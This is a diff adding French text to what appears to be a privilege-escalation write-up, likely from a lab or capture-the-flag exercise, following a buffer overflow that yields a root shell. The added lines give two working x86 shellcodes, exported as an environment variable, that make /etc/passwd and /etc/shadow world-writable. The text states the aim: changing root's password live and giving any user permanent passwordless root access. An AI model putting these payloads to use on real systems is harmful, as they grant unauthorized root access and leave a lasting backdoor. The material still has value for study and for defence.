@@ -17,3 +17,12 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 # whoami
 root
 ```
+Cette faille est beaucoup plus puissante que la précédente, on peut rendre le fichier `/etc/passwd` editable via ce shellcode :
+```
+export LIDLCODE=$(python -c 'print "\x6a\x0f\x58\x68\x90\x90\xff\x01\x59\xc1\xe9\x10\x68\x90\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80"')
+```
+Ou même /etc/shadow avec :
+```
+export LIDLCODE=$(python -c 'print "\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\xb0\x0f\x89\xe3\x66\xb9\xff\x01\xcd\x80\x31\xc0\x40\xcd\x80"')
+```
+Afin de pouvoir modifier le mot de passe de root en live et rendre son acces permanant pour tout utilisateur sans mot de passe.
